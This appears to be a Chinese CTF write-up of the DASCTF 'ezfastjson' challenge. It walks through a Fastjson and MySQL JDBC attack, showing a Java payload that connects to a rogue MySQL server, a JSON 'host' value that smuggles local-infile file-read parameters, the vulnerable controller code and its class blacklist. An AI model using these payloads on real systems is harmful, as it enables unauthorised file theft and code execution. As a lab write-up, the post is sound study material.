---
layout: post
title: DASCTF ezfastjson赛题复现
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzi
---







## 自己当时做题的思考

这道题和之前的那个柏鹭杯的那道题好相似，页面都是一样的。

![image-20231125103229032](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231125103229032.png)

奇怪的是它的响应包并没有任何服务器的信息？

![image-20231125105729022](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231125105729022.png)

考虑 Mysql connector RCE,但是这种方法是连接到恶意的mysql服务器，可是这道题的mysql服务器是题目给的（不可控）

猜测它后面的源码是，直接把输入的东西进行一个拼接



先构造一个恶意的服务器的恶意连接（）

![image-20231125115728882](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231125115728882.png)

并且传入值也是可以任意修改的而且是json模式解析，结合题目是ezfastjson

![image-20231125115948115](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231125115948115.png)

在本地构造直接反序列化起码会连接上恶意的服务器，但是到了题目一点响应都没有

![image-20231125122613470](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231125122613470.png)

直接打urldns发现是出网的，啊啊啊？？？（看一下题解，已经一解了）

莫非直接打链子？？？

![image-20231125124730407](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231125124730407.png)

盲打jdbc没打通，其实我感觉jar包中肯定没有其他的第三方库依赖，继续打一下jndi

![image-20231125132301834](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231125132301834.png)



## 赛后复现

只打通了urldns，以为这道题是一个黑盒题目，学长直接拿黑盒打的，用urldns探测依赖

然后发现是一个mysql任意文件读取的漏洞，上一篇文章已经详细介绍了

本地用的MySQL_Fake_Server-master这个项目直接启动，server.py

```java
import java.sql.Connection;
import java.sql.DriverManager;
    public class payload {
        public static void main(String[] args) throws Exception {
            String driver = "com.mysql.cj.jdbc.Driver";
            String DB_URL = "jdbc:mysql://8.130.116.247:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
                DB_URL="jdbc:mysql://8.130.116.247:3307?useSSL=true&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_C:\\Users\\c'x'k\\Desktop\\MySQL_Fake_Server-master\\ysoserial-0.0.6-SNAPSHOT-all.jar";

            String username = "root";
            String password = "200377";

            Class.forName(driver);

            Connection conn = DriverManager.getConnection(DB_URL);

        }
    }
```

因为题目用的json传输

```java
{"host":"8.130.116.247:3307/test?user=fileread_file:///&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#"}
```

读取根目录的文件，在服务器开启监听

![image-20231128163121058](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128163121058.png)

![image-20231128163152864](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128163152864.png)

![image-20231128163225474](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128163225474.png)

![image-20231128163405972](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128163405972.png)

app/ezfastjson-0.0.1-SNAPSHOT.jar直接读取这个

![image-20231128163628867](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128163628867.png)

### 开始分析

```java
fastjson 1.2.43
groovy-3.0.19
mysql-connector-java-8.0.1
snakeyaml-1.30
```

groovy这个依赖没见过。

啊fastjsonhttps://github.com/safe6Sec/Fastjson，这个探测依赖版本也不靠谱呀，题目是1.2.43的

![image-20231128165326167](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128165326167.png)

果然是直接将传入的json对象，直接进行JSON的反序列化

传入urldns链子的时候是，parseObject进行反序列化

传入host的时候是进行jdbc的连接（这一块的代码没想到，但也应该想到的）

```java
public class TestMySQLConnectionController {
    @RequestMapping({"/testMySQLConnection"})
    public String showTestMySQLConnectionPage() {
        return "testMySQLConnection";
    }

    @PostMapping({"/testMySQLConnection"})
    @ResponseBody
    public String testMySQLConnection(@RequestBody String jsonData, Model model) {//jsonData就是我们post传的参数
        try {
            JSONObject json = JSONObject.parseObject(jsonData);
            if (jsonData.contains("@") || jsonData.contains("\\x") || jsonData.contains("\\u")) {
                //这里禁用，是为了防止绕过但呃呃呃，不应该在前面禁用嘛，毕竟到这里已经反序列化成功了唉
                return "出错了";
            }
            String host = json.getString("host");
            String port = json.getString("port");
            String database = json.getString("database");
            String username = json.getString("username");
            String password = json.getString("password");
            System.out.println(host);
            String url = "jdbc:mysql://" + host + ":" + port + "/" + database + "?user=" + username + "&password=" + password; 
            //
            System.out.println(url);
            Class.forName("com.mysql.cj.jdbc.Driver");
            Connection connection = DriverManager.getConnection(url);
            model.addAttribute("message", "MySQL数据库连接成功！");
            connection.close();
            return "testMySQLConnection";
        } catch (ClassNotFoundException | SQLException e) {
            model.addAttribute("message", "MySQL数据库连接失败，请检查连接信息。");
            e.printStackTrace();
            return "testMySQLConnection";
        }
    }

    @PostMapping({"/readObj"})
    @ResponseBody
    public String deserializeData(@RequestParam String base64Data) {
        try {
            new MyObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64Data))).readObject();//这才是真正的反序列化的点
            return "ok";
        } catch (Exception var4) {
            return var4.getMessage();
        }
    }
}
```

```java
    private static final String[] blackList = {"AbstractTranslet", "javax.management", "JSONObject", "bad", "hot", "hash", "java.security", "jackson"};
```

### 非预期：这道题目前已经转换为了fastjson 1.2.43反序列化漏洞

看官方wp说没有bash，怪不得学长反弹shell没成功，即使我打到这应该也蒙蔽

```java
Thread.sleep()
```

按理说我本地应该通的呀。。。

![image-20231128210814332](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128210814332.png)

用这个软件就能一把梭，但是参数只能设置Runtime命令执行里面的，我本想搞一个Thread.sleep这样成不成功就能看出来，反编译工具，看不懂。。。

![image-20231128211807822](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231128211807822.png)

```java
{"AbstractTranslet", "javax.management", "JSONObject", "bad", "hot", "hash", "java.security", "jackson"};
```

